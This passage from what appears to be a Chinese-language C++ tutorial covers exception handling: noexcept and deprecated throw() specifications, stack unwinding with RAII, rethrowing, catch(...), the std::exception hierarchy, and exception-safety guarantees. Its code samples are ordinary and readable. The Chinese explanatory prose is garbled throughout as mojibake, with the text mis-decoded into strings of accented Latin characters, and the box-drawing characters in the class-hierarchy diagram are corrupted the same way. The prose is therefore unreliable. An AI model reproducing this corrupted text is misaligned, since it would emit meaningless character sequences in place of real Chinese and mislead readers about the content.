ç¼–è¯‘å™¨é€šå¸¸åªåœ¨è¿è¡Œæ—¶æ£€æŸ¥ï¼Œè€Œä¸æ˜¯ç¼–è¯‘æ—¶ã€‚</li><li>  å¦‚æœå‡½æ•°æŠ›å‡ºäº†æœªåœ¨è§„èŒƒä¸­åˆ—å‡ºçš„å¼‚å¸¸ï¼Œç¨‹åºçš„è¡Œä¸ºæ˜¯è°ƒç”¨ <code>std::unexpected()</code>ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒä¼šè°ƒç”¨ <code>std::terminate()</code>ã€‚</li><li>  æ¨¡æ¿ä»£ç éš¾ä»¥ä½¿ç”¨å¼‚å¸¸è§„èŒƒã€‚</li><li>  ç»´æŠ¤æˆæœ¬é«˜ï¼Œä¿®æ”¹åº•å±‚å‡½æ•°å¯èƒ½éœ€è¦æ›´æ–°æ•´ä¸ªè°ƒç”¨é“¾çš„å¼‚å¸¸è§„èŒƒã€‚</li></ul><p><strong>C++11 çš„æ”¹å˜:</strong></p><ul><li>  <strong>åºŸå¼ƒ <code>throw(...)</code> è§„èŒƒ:</strong> C++11 åºŸå¼ƒäº†é™¤ <code>throw()</code> ä¹‹å¤–çš„åŠ¨æ€å¼‚å¸¸è§„èŒƒã€‚</li><li><strong>å¼•å…¥ <code>noexcept</code>:</strong> C++11 å¼•å…¥äº† <code>noexcept</code> è¯´æ˜ç¬¦ï¼Œç”¨äºæ˜ç¡®è¡¨ç¤ºå‡½æ•°<strong>ä¿è¯ä¸æŠ›å‡ºä»»ä½•å¼‚å¸¸</strong>ã€‚<ul><li>  <code>void func_no_throw() noexcept;</code> // ä¿è¯ä¸æŠ›å‡º</li><li>  <code>void func_maybe_throw();</code> // å¯èƒ½æŠ›å‡º (åŒ C++98 é»˜è®¤)</li><li>  <code>noexcept</code> è¿˜å¯ä»¥å¸¦ä¸€ä¸ªå¸¸é‡è¡¨è¾¾å¼å‚æ•°ï¼š<code>noexcept(expression)</code>ã€‚å¦‚æœè¡¨è¾¾å¼ä¸º <code>true</code>ï¼Œåˆ™å‡½æ•°ä¿è¯ä¸æŠ›å‡ºï¼›å¦‚æœä¸º <code>false</code>ï¼Œåˆ™å¯èƒ½æŠ›å‡ºã€‚</li></ul></li><li>  <strong><code>throw()</code> ç­‰ä»·äº <code>noexcept(true)</code>:</strong> ç©ºçš„ <code>throw()</code> è§„èŒƒåœ¨ C++11 ä¸­è¢«è§†ä¸ºç­‰åŒäº <code>noexcept(true)</code>ã€‚</li><li>  <strong>è¿å <code>noexcept</code>:</strong> å¦‚æœä¸€ä¸ªå£°æ˜ä¸º <code>noexcept</code> çš„å‡½æ•°å®é™…ä¸ŠæŠ›å‡ºäº†å¼‚å¸¸ï¼Œç¨‹åºä¼šè°ƒç”¨ <code>std::terminate()</code>ï¼Œè€Œ<strong>ä¸æ˜¯</strong>è¿›è¡Œæ ˆè§£é€€æ¥æŸ¥æ‰¾å¤„ç†ç¨‹åºã€‚è¿™ä½¿å¾— <code>noexcept</code> æˆä¸ºä¸€ä¸ªæ›´å¼ºçš„ä¿è¯ï¼Œç¼–è¯‘å™¨å¯ä»¥åˆ©ç”¨å®ƒè¿›è¡Œä¼˜åŒ–ã€‚</li></ul><p><strong>å»ºè®®:</strong></p><ul><li>  <strong>ä¸è¦ä½¿ç”¨</strong> C++11 åºŸå¼ƒçš„åŠ¨æ€å¼‚å¸¸è§„èŒƒ <code>throw(Type1, Type2)</code>ã€‚</li><li>  å¦‚æœå‡½æ•°ç¡®å®èƒ½ä¿è¯ä¸æŠ›å‡ºå¼‚å¸¸ï¼Œæˆ–è€…å³ä½¿æŠ›å‡ºä¹Ÿåº”è§†ä¸ºä¸¥é‡é”™è¯¯å¯¼è‡´ç¨‹åºç»ˆæ­¢ï¼Œè¯·ä½¿ç”¨ <code>noexcept</code>ã€‚è¿™å¯¹ç§»åŠ¨æ„é€ å‡½æ•°ã€ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦å’Œææ„å‡½æ•°å°¤å…¶é‡è¦ï¼Œå› ä¸ºæ ‡å‡†åº“çš„æŸäº›æ“ä½œï¼ˆå¦‚ <code>std::vector</code> é‡æ–°åˆ†é…å†…å­˜ï¼‰ä¾èµ–äºè¿™äº›æ“ä½œçš„ <code>noexcept</code> ä¿è¯æ¥æä¾›å¼ºå¼‚å¸¸å®‰å…¨ä¿è¯ã€‚</li><li>  å¦‚æœå‡½æ•°å¯èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œçœç•¥ <code>noexcept</code> (æˆ–ä½¿ç”¨ <code>noexcept(false)</code>)ã€‚</li></ul><h3 id="15-3-6-æ ˆè§£é€€-Stack-Unwinding"><a href="#15-3-6-æ ˆè§£é€€-Stack-Unwinding" class="headerlink" title="15.3.6 æ ˆè§£é€€ (Stack Unwinding)"></a>15.3.6 æ ˆè§£é€€ (Stack Unwinding)</h3><p>å½“å¼‚å¸¸è¢«æŠ›å‡ºæ—¶ï¼Œç¨‹åºä¼šæš‚åœå½“å‰å‡½æ•°çš„æ‰§è¡Œï¼Œå¹¶å¼€å§‹æ²¿ç€å‡½æ•°è°ƒç”¨é“¾<strong>åå‘</strong>æŸ¥æ‰¾åŒ¹é…çš„ <code>catch</code> å—ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå·²ç»æ‰§è¡Œå®Œæ¯•çš„å‡½æ•°ï¼ˆä» <code>try</code> å—å¼€å§‹åˆ° <code>throw</code> ç‚¹ï¼‰ä¼šä¾æ¬¡é€€å‡ºï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸º**æ ˆè§£é€€ (Stack Unwinding)**ã€‚</p><p><strong>å…³é”®ç‚¹:</strong> åœ¨æ ˆè§£é€€è¿‡ç¨‹ä¸­ï¼Œå‡½æ•°è°ƒç”¨æ ˆä¸Šåˆ›å»ºçš„<strong>å±€éƒ¨å¯¹è±¡</strong>ä¼šæŒ‰ç…§å…¶æ„é€ ç›¸åçš„é¡ºåºè¢«<strong>é”€æ¯</strong>ï¼Œå³å®ƒä»¬çš„<strong>ææ„å‡½æ•°ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</strong>ã€‚</p><p>è¿™å°±æ˜¯ <strong>RAII (Resource Acquisition Is Initialization)</strong> æ¨¡å¼ä¸å¼‚å¸¸å¤„ç†ååŒå·¥ä½œçš„å…³é”®ã€‚å¦‚æœèµ„æºï¼ˆå¦‚åŠ¨æ€å†…å­˜ã€æ–‡ä»¶å¥æŸ„ã€é”ï¼‰ç”±å±€éƒ¨å¯¹è±¡ï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆ <code>std::unique_ptr</code>, æ–‡ä»¶æµ <code>std::ofstream</code>, é”å®ˆå« <code>std::lock_guard</code>ï¼‰åœ¨å…¶ç”Ÿå‘½å‘¨æœŸå†…ç®¡ç†ï¼Œé‚£ä¹ˆå³ä½¿å‘ç”Ÿå¼‚å¸¸ï¼Œå½“æ ˆè§£é€€å¯¼è‡´è¿™äº›å±€éƒ¨å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå®ƒä»¬çš„ææ„å‡½æ•°ä¹Ÿä¼šè¢«è°ƒç”¨ï¼Œä»è€Œç¡®ä¿èµ„æºè¢«æ­£ç¡®é‡Šæ”¾ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt; // for std::unique_ptr</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_resource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; <span class="title">p_res</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">10</span>))</span></span>; <span class="comment">// RAII: èµ„æºç”± unique_ptr ç®¡ç†</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... ä½¿ç”¨ p_res ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="comment">/* some error condition */</span> <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">&quot;Something went wrong in process_resource&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... æ›´å¤šä»£ç  ...</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// å¦‚æœæ­£å¸¸ç»“æŸï¼Œp_res åœ¨è¿™é‡Œé”€æ¯ï¼Œé‡Šæ”¾å†…å­˜</span></span><br><span class="line">  <span class="comment">// å¦‚æœæŠ›å‡ºå¼‚å¸¸ï¼Œæ ˆè§£é€€æ—¶ p_res ä¹Ÿä¼šè¢«é”€æ¯ï¼Œé‡Šæ”¾å†…å­˜</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">caller</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process_resource();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::runtime_error&amp; e) &#123;</span><br><span class="line">        <span class="comment">// å¤„ç†å¼‚å¸¸</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> å¦‚æœåœ¨æ ˆè§£é€€è¿‡ç¨‹ä¸­ï¼ŒæŸä¸ªå¯¹è±¡çš„ææ„å‡½æ•°<strong>è‡ªèº«</strong>æŠ›å‡ºäº†å¼‚å¸¸ï¼Œè€Œæ­¤æ—¶å·²ç»æœ‰ä¸€ä¸ªå¼‚å¸¸æ­£åœ¨å¤„ç†ä¸­ï¼Œç¨‹åºä¼šè°ƒç”¨ <code>std::terminate()</code>ã€‚å› æ­¤ï¼Œ<strong>ææ„å‡½æ•°åº”è¯¥é¿å…æŠ›å‡ºå¼‚å¸¸</strong>ï¼ˆé€šå¸¸åº”å£°æ˜ä¸º <code>noexcept</code>ï¼‰ã€‚</p><h3 id="15-3-7-å…¶ä»–å¼‚å¸¸ç‰¹æ€§"><a href="#15-3-7-å…¶ä»–å¼‚å¸¸ç‰¹æ€§" class="headerlink" title="15.3.7 å…¶ä»–å¼‚å¸¸ç‰¹æ€§"></a>15.3.7 å…¶ä»–å¼‚å¸¸ç‰¹æ€§</h3><ul><li><p><strong>é‡æ–°æŠ›å‡ºå¼‚å¸¸ (<code>throw;</code>):</strong> åœ¨ <code>catch</code> å—å†…éƒ¨ï¼Œå¯ä»¥ä½¿ç”¨ä¸å¸¦ä»»ä½•æ“ä½œæ•°çš„ <code>throw;</code> è¯­å¥å°†<strong>å½“å‰æ•è·åˆ°çš„å¼‚å¸¸</strong>é‡æ–°æŠ›å‡ºï¼Œäº¤ç”±å¤–å±‚çš„ <code>catch</code> å—å¤„ç†ã€‚è¿™å…è®¸ä¸€ä¸ª <code>catch</code> å—æ‰§è¡Œéƒ¨åˆ†å¤„ç†ï¼ˆå¦‚è®°å½•æ—¥å¿—ï¼‰ï¼Œç„¶åå°†å¼‚å¸¸ä¼ é€’ç»™æ›´é«˜å±‚è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (<span class="keyword">const</span> MyException&amp; e) &#123;</span><br><span class="line">    log_error(e.what()); <span class="comment">// è®°å½•é”™è¯¯</span></span><br><span class="line">    <span class="keyword">if</span> (can_handle_partially(e)) &#123;</span><br><span class="line">        <span class="comment">// ... éƒ¨åˆ†å¤„ç† ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span>; <span class="comment">// é‡æ–°æŠ›å‡ºåŸå§‹å¼‚å¸¸ï¼Œè®©å¤–å±‚å¤„ç†</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>æ•è·æ‰€æœ‰å¼‚å¸¸ (<code>catch(...)</code>):</strong> <code>catch(...)</code> å¯ä»¥æ•è·ä»»ä½•ç±»å‹çš„å¼‚å¸¸ã€‚å®ƒé€šå¸¸æ”¾åœ¨æ‰€æœ‰å…¶ä»– <code>catch</code> å—çš„æœ€åï¼Œç”¨äºè¿›è¡Œæœ€ç»ˆçš„æ¸…ç†æˆ–è®°å½•æœªçŸ¥é”™è¯¯ã€‚åœ¨ <code>catch(...)</code> å—å†…éƒ¨æ— æ³•çŸ¥é“æ•è·åˆ°çš„å¼‚å¸¸çš„å…·ä½“ç±»å‹å’Œä¿¡æ¯ï¼ˆé™¤éé‡æ–°æŠ›å‡ºç»™å¤–å±‚ï¼‰ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (...) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught an unexpected exception type!\n&quot;</span>;</span><br><span class="line">    <span class="comment">// å¯èƒ½è¿›è¡Œä¸€äº›é€šç”¨æ¸…ç†</span></span><br><span class="line">    <span class="comment">// throw; // å¯ä»¥é‡æ–°æŠ›å‡ºï¼Œå¦‚æœå¤–å±‚å¯èƒ½çŸ¥é“å¦‚ä½•å¤„ç†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="15-3-8-exception-ç±»"><a href="#15-3-8-exception-ç±»" class="headerlink" title="15.3.8 exception ç±»"></a>15.3.8 exception ç±»</h3><p>C++ æ ‡å‡†åº“åœ¨ <code>&lt;exception&gt;</code> å¤´æ–‡ä»¶ä¸­å®šä¹‰äº†ä¸€ä¸ªæ ‡å‡†çš„å¼‚å¸¸åŸºç±» <code>std::exception</code>ã€‚æ ‡å‡†åº“æŠ›å‡ºçš„è®¸å¤šå¼‚å¸¸ï¼ˆå¦‚ <code>std::bad_alloc</code>, <code>std::bad_cast</code>, <code>std::runtime_error</code>, <code>std::logic_error</code> ç­‰ï¼‰éƒ½ç›´æ¥æˆ–é—´æ¥ä»æ­¤ç±»æ´¾ç”Ÿã€‚</p><p><code>std::exception</code> æä¾›äº†ä¸€ä¸ªé‡è¦çš„è™šæˆå‘˜å‡½æ•°ï¼š</p><ul><li><code>virtual const char* what() const noexcept;</code><ul><li>  è¿”å›ä¸€ä¸ªæè¿°å¼‚å¸¸çš„ C é£æ ¼å­—ç¬¦ä¸²ã€‚æ´¾ç”Ÿç±»é€šå¸¸ä¼šè¦†ç›–æ­¤æ–¹æ³•ä»¥æä¾›æ›´å…·ä½“çš„é”™è¯¯ä¿¡æ¯ã€‚</li></ul></li></ul><p>å»ºè®®è‡ªå®šä¹‰çš„å¼‚å¸¸ç±»ä¹Ÿç»§æ‰¿è‡ª <code>std::exception</code> æˆ–å…¶æ´¾ç”Ÿç±»ï¼Œè¿™æ ·å¯ä»¥æ›´å®¹æ˜“åœ°ä¸æ ‡å‡†åº“å¼‚å¸¸å’Œé€šç”¨çš„å¼‚å¸¸å¤„ç†ä»£ç é›†æˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // åŒ…å« runtime_error, logic_error ç­‰</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLogicError</span> :</span> <span class="keyword">public</span> <span class="built_in">std</span>::logic_error &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MyLogicError</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; what_arg)</span></span></span><br><span class="line"><span class="function">        : <span class="title">std::logic_error</span><span class="params">(what_arg)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="comment">// what() ä¼šç»§æ‰¿ std::logic_error çš„å®ç°ï¼Œè¿”å›æ„é€ æ—¶ä¼ å…¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> MyLogicError(<span class="string">&quot;Custom logic error occurred&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::exception&amp; e) &#123; <span class="comment">// æ•è·æ‰€æœ‰æ ‡å‡†å¼‚å¸¸åŠæ´¾ç”Ÿç±»</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Caught standard exception: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ‡å‡†å¼‚å¸¸ç±»å±‚æ¬¡ç»“æ„ï¼ˆéƒ¨åˆ†ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">std::exception</span><br><span class="line">  â”œâ”€â”€ std::logic_error</span><br><span class="line">  â”‚     â”œâ”€â”€ std::domain_error</span><br><span class="line">  â”‚     â”œâ”€â”€ std::invalid_argument</span><br><span class="line">  â”‚     â”œâ”€â”€ std::length_error</span><br><span class="line">  â”‚     â””â”€â”€ std::out_of_range</span><br><span class="line">  â”œâ”€â”€ std::runtime_error</span><br><span class="line">  â”‚     â”œâ”€â”€ std::overflow_error</span><br><span class="line">  â”‚     â”œâ”€â”€ std::underflow_error</span><br><span class="line">  â”‚     â”œâ”€â”€ std::range_error</span><br><span class="line">  â”‚     â””â”€â”€ std::system_error (C++11)</span><br><span class="line">  â”œâ”€â”€ std::bad_alloc      (new å¤±è´¥)</span><br><span class="line">  â”œâ”€â”€ std::bad_cast       (dynamic_cast åˆ°å¼•ç”¨å¤±è´¥)</span><br><span class="line">  â”œâ”€â”€ std::bad_typeid     (typeid ç”¨äºç©ºæŒ‡é’ˆ)</span><br><span class="line">  â””â”€â”€ std::bad_exception  (å¤„ç† unexpected() æ—¶å¯èƒ½æŠ›å‡º)</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><h3 id="15-3-9-å¼‚å¸¸ã€ç±»å’Œç»§æ‰¿"><a href="#15-3-9-å¼‚å¸¸ã€ç±»å’Œç»§æ‰¿" class="headerlink" title="15.3.9 å¼‚å¸¸ã€ç±»å’Œç»§æ‰¿"></a>15.3.9 å¼‚å¸¸ã€ç±»å’Œç»§æ‰¿</h3><p>å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸ç±»å’Œç»§æ‰¿è‰¯å¥½åœ°äº¤äº’ï¼š</p><ul><li>  <strong>ç±»å¯¹è±¡ä½œä¸ºå¼‚å¸¸:</strong> å¦‚å‰æ‰€è¿°ï¼Œæ¨èä½¿ç”¨ç±»å¯¹è±¡ã€‚</li><li>  <strong>ç»§æ‰¿å±‚æ¬¡:</strong> å¯ä»¥æ•è·åŸºç±»å¼‚å¸¸æ¥å¤„ç†æ´¾ç”Ÿç±»å¼‚å¸¸ã€‚</li><li>  <strong>æ„é€ å‡½æ•°ä¸­çš„å¼‚å¸¸:</strong> å¦‚æœæ„é€ å‡½æ•°åœ¨å¯¹è±¡å®Œå…¨æ„é€ å¥½ä¹‹å‰æŠ›å‡ºå¼‚å¸¸ï¼Œè¯¥å¯¹è±¡çš„ææ„å‡½æ•°<strong>ä¸ä¼š</strong>è¢«è°ƒç”¨ã€‚ä½†æ˜¯ï¼Œå·²ç»<strong>å®Œå…¨æ„é€ å¥½</strong>çš„æˆå‘˜å¯¹è±¡å’ŒåŸºç±»å­å¯¹è±¡çš„ææ„å‡½æ•°ä¼šæŒ‰ç…§æ„é€ ç›¸åçš„é¡ºåºè¢«è°ƒç”¨ï¼ˆæ ˆè§£é€€çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚å› æ­¤ï¼Œæ„é€ å‡½æ•°éœ€è¦ç‰¹åˆ«æ³¨æ„èµ„æºç®¡ç†ï¼Œæœ€å¥½ä½¿ç”¨ RAII æˆå‘˜ï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆï¼‰æ¥é¿å…èµ„æºæ³„æ¼ã€‚</li><li>  <strong>ææ„å‡½æ•°ä¸­çš„å¼‚å¸¸:</strong> ææ„å‡½æ•°<strong>ä¸åº”è¯¥</strong>æŠ›å‡ºå¼‚å¸¸ã€‚å¦‚æœææ„å‡½æ•°åœ¨æ ˆè§£é€€è¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œä¼šå¯¼è‡´ <code>std::terminate()</code>ã€‚å¦‚æœææ„å‡½æ•°å†…éƒ¨çš„æ“ä½œå¯èƒ½å¤±è´¥ï¼Œåº”å°†å¤±è´¥ä¿¡æ¯è®°å½•ä¸‹æ¥æˆ–æä¾›å…¶ä»–æŸ¥è¯¢æ–¹å¼ï¼Œè€Œä¸æ˜¯æŠ›å‡ºå¼‚å¸¸ã€‚</li></ul><h3 id="15-3-10-å¼‚å¸¸ä½•æ—¶ä¼šè¿·å¤±æ–¹å‘-Uncaught-Exceptions"><a href="#15-3-10-å¼‚å¸¸ä½•æ—¶ä¼šè¿·å¤±æ–¹å‘-Uncaught-Exceptions" class="headerlink" title="15.3.10 å¼‚å¸¸ä½•æ—¶ä¼šè¿·å¤±æ–¹å‘ (Uncaught Exceptions)"></a>15.3.10 å¼‚å¸¸ä½•æ—¶ä¼šè¿·å¤±æ–¹å‘ (Uncaught Exceptions)</h3><p>å¦‚æœä¸€ä¸ªå¼‚å¸¸è¢«æŠ›å‡ºåï¼Œæ²¿ç€è°ƒç”¨æ ˆä¸€ç›´ä¼ æ’­åˆ° <code>main</code> å‡½æ•°ä¹‹å¤–éƒ½æ²¡æœ‰è¢«ä»»ä½• <code>catch</code> å—æ•è·ï¼Œè¿™ä¸ªå¼‚å¸¸å°±ç§°ä¸º**æœªæ•è·å¼‚å¸¸ (Uncaught Exception)**ã€‚</p><p>å½“å‘ç”Ÿæœªæ•è·å¼‚å¸¸æ—¶ï¼ŒC++ è¿è¡Œæ—¶ç³»ç»Ÿä¼šè°ƒç”¨ <code>std::terminate()</code> å‡½æ•°ï¼ˆå®šä¹‰åœ¨ <code>&lt;exception&gt;</code> ä¸­ï¼‰ã€‚<code>std::terminate()</code> çš„é»˜è®¤è¡Œä¸ºæ˜¯è°ƒç”¨ <code>std::abort()</code>ï¼Œå¯¼è‡´ç¨‹åºå¼‚å¸¸ç»ˆæ­¢ã€‚</p><p>å¯ä»¥é€šè¿‡ <code>std::set_terminate()</code> å‡½æ•°æ¥æ³¨å†Œä¸€ä¸ªè‡ªå®šä¹‰çš„ç»ˆæ­¢å¤„ç†ç¨‹åºï¼Œåœ¨ <code>std::terminate()</code> è¢«è°ƒç”¨æ—¶æ‰§è¡Œä¸€äº›è‡ªå®šä¹‰æ“ä½œï¼ˆå¦‚è®°å½•æ—¥å¿—ï¼‰ï¼Œä½†è¿™ä¸ªè‡ªå®šä¹‰å¤„ç†ç¨‹åºæœ€ç»ˆä¹Ÿå¿…é¡»ç»ˆæ­¢ç¨‹åºï¼ˆä¾‹å¦‚é€šè¿‡è°ƒç”¨ <code>abort()</code> æˆ– <code>exit()</code>ï¼‰ï¼Œä¸èƒ½è¿”å›ã€‚</p><h3 id="15-3-11-æœ‰å…³å¼‚å¸¸çš„æ³¨æ„äº‹é¡¹"><a href="#15-3-11-æœ‰å…³å¼‚å¸¸çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="15.3.11 æœ‰å…³å¼‚å¸¸çš„æ³¨æ„äº‹é¡¹"></a>15.3.11 æœ‰å…³å¼‚å¸¸çš„æ³¨æ„äº‹é¡¹</h3><ul><li>  <strong>æ€§èƒ½:</strong> å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼ˆç‰¹åˆ«æ˜¯ <code>throw</code> å’Œæ ˆè§£é€€ï¼‰é€šå¸¸æ¯”è¿”å›é”™è¯¯ç æœ‰æ›´é«˜çš„è¿è¡Œæ—¶å¼€é”€ã€‚å› æ­¤ï¼Œå¼‚å¸¸åº”è¯¥ç”¨äºå¤„ç†<strong>å¼‚å¸¸</strong>æƒ…å†µï¼Œè€Œä¸æ˜¯ç”¨äºæ­£å¸¸çš„ç¨‹åºæµç¨‹æ§åˆ¶ã€‚å¯¹äºé¢„æœŸä¼šé¢‘ç¹å‘ç”Ÿçš„â€œé”™è¯¯â€ï¼ˆå¦‚ç”¨æˆ·è¾“å…¥æ ¼å¼é”™è¯¯ï¼‰ï¼Œå¯èƒ½ä½¿ç”¨é”™è¯¯ç æˆ–å…¶ä»–æ–¹å¼æ›´åˆé€‚ã€‚</li><li><strong>å¼‚å¸¸å®‰å…¨ (Exception Safety):</strong> ç¼–å†™åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶ä»èƒ½ä¿æŒæ­£ç¡®çŠ¶æ€ï¼ˆä¾‹å¦‚ï¼Œä¸æ³„æ¼èµ„æºã€ä¿æŒæ•°æ®ä¸€è‡´æ€§ï¼‰çš„ä»£ç éå¸¸é‡è¦ã€‚RAII æ˜¯å®ç°å¼‚å¸¸å®‰å…¨çš„å…³é”®æŠ€æœ¯ã€‚å‡½æ•°é€šå¸¸è¿½æ±‚ä»¥ä¸‹å‡ ç§å¼‚å¸¸å®‰å…¨ä¿è¯çº§åˆ«ï¼ˆä»å¼±åˆ°å¼ºï¼‰ï¼š<ol><li> <strong>åŸºæœ¬ä¿è¯ (Basic Guarantee):</strong> æ“ä½œå¤±è´¥æ—¶ï¼Œå¯¹è±¡ä¿æŒåœ¨æŸä¸ªæœ‰æ•ˆçŠ¶æ€ï¼ˆä¸ä¸€å®šå’Œæ“ä½œå‰ç›¸åŒï¼‰ï¼Œæ²¡æœ‰èµ„æºæ³„æ¼ã€‚</li><li> <strong>å¼ºä¿è¯ (Strong Guarantee):</strong> æ“ä½œå¤±è´¥æ—¶ï¼Œå¯¹è±¡çš„çŠ¶æ€å›æ»šåˆ°æ“ä½œå¼€å§‹ä¹‹å‰çš„çŠ¶æ€ï¼ˆäº‹åŠ¡æ€§ï¼‰ã€‚</li><li> <strong>ä¸æŠ›å‡ºä¿è¯ (Nothrow Guarantee):</strong> æ“ä½œä¿è¯ä¸ä¼šæŠ›å‡ºä»»ä½•å¼‚å¸¸ (<code>noexcept</code>)ã€‚</li></ol></li><li>  <strong>ææ„å‡½æ•°:</strong> ç»å¯¹ä¸è¦è®©ææ„å‡½æ•°æŠ›å‡ºå¼‚å¸¸ã€‚</li><li>  <strong>æ„é€ å‡½æ•°:</strong> è°¨æ…å¤„ç†æ„é€ å‡½æ•°ä¸­çš„å¼‚å¸¸ï¼Œä½¿ç”¨ RAII ç®¡ç†èµ„æºã€‚</li><li>  <strong>ä½•æ—¶ä½¿ç”¨:</strong> å¼‚å¸¸æœ€é€‚åˆå¤„ç†é‚£äº›é˜»æ­¢å‡½æ•°å®Œæˆå…¶é¢„æœŸä»»åŠ¡çš„ã€ä¸å¸¸è§çš„é”™è¯¯æƒ…å†µï¼Œç‰¹åˆ«æ˜¯å½“é”™è¯¯å‘ç”Ÿåœ¨æ·±å±‚åµŒå¥—è°ƒç”¨ä¸­ï¼Œéœ€è¦å°†é”™è¯¯ä¿¡æ¯ä¼ é€’ç»™é«˜å±‚è°ƒç”¨è€…æ—¶ã€‚</li></ul><p>å¼‚å¸¸å¤„ç†æ˜¯ C++ 